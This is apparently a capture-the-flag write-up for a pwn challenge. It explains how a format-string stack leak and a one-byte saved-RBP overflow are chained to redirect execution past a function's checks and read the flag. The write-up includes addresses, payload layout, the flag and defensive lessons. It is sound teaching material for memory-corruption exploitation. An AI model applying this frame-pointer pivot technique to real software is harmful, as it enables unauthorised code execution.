# Maintenance Log — Pwn, 150 pts

## Objective
`nc 34.116.80.78 7312`. A 64-bit ELF (`chall`) whose "interface IS LEAKING".
Forge a report, bypass the perimeter, get admin clearance (= read `flag.txt`).
Flag format: `CSSCTF{...}`

## Concepts
- **checksec**: 64-bit, **No PIE** (fixed addresses, base `0x400000`), NX, Partial RELRO,
  stack canary present — *but the vulnerable functions don't use it*.
- **Format-string leak**: `printf("...allocated at: %p")` is called with `rsi = rbp-0x50`,
  so it leaks the **exact stack address of the input buffer**. No brute-force needed.
- **Off-by-one (saved RBP)**: a `read(0, buf, 0x21)` into a `0x20` buffer overwrites **one byte**
  of the saved RBP. Corrupting RBP's low byte pivots the caller's `leave; ret`
  (`mov rsp,rbp; pop rbp; ret`) so RIP is fetched from a buffer we control → **ret2win**.
- **ret2win**: a hidden branch opens/prints `flag.txt`. Jumping past its argument checks
  (`arg1==0xdeadbeef && arg2==0xcafebabe`) straight to the file-read code = instant flag.

## Steps
Reverse (stripped) with `objdump -d -M intel chall`. Key addresses found:
- `0x40129f` — flag path: `puts("Access Granted")` → `fopen("flag.txt")` → `fgets` → `puts` → `exit`.
  (It lives inside the checked function `0x401268`; jumping mid-function skips the checks.)
- Report handler `0x40139a`: `printf(leak %p)` → `read(0, rbp-0x50, 0x50)` (fills buffer, no overflow)
  → calls `0x401348`.
- `0x401348`: `printf("Tagging operator:")` → `read(0, rbp2-0x20, 0x21)` → **1-byte RBP overflow**.

**Exploit logic** (leak arrives *before* the first read, so we know the stack live):
```
leak      = buffer address        # = R - 0x50, where R = report frame's rbp
R         = leak + 0x50
B         = (R & 0xff) - 0x10     # sets corrupted RBP' = R - 0x10
read#1 (0x50): b'A'*0x40 + p64(fake_rbp) + p64(0x40129f)   # fake frame at offset 0x40
read#2 (0x21): b'B'*0x20 + bytes([B])                      # overwrite saved-RBP LSB
```
After both functions' `leave; ret`:
`rsp → R-0x10`, `pop rbp → fake_rbp`, `ret → RIP = [R-0x08] = 0x40129f`.
`fake_rbp = leak+0x500` (writable stack) so `0x40129f`'s `rbp-0x58`/`rbp-0x50` are valid.
Alignment: we enter `0x40129f` with `rsp = R` (16-aligned) → ABI-correct, libc calls don't crash.
1/16 of runs have `R & 0xff < 0x10` → just reconnect (socat forks a fresh stack each time).

Full script: [maintenance-log-exploit.py](maintenance-log-exploit.py) (raw sockets, no pwntools).

## Flag
```
CSSCTF{Duh_m4t3_1_4m_sl33py}
```

## Takeaway
A **1-byte overflow of the saved RBP** is enough for full control: it doesn't touch the return
address or the canary, it shifts the *frame pointer* so the epilogue re-reads RIP from attacker
data. Pair it with a **format-string leak** for the stack address and a **No-PIE ret2win** target
and you never need libc. Lessons: read/buffer sizes must match; `%p` with no matching arg leaks the
stack; and a "win" function is only as safe as its *first* instruction — always land past the checks.
Defence: bounds-check reads, `-D_FORTIFY_SOURCE`, PIE + full RELRO, and never print raw pointers.
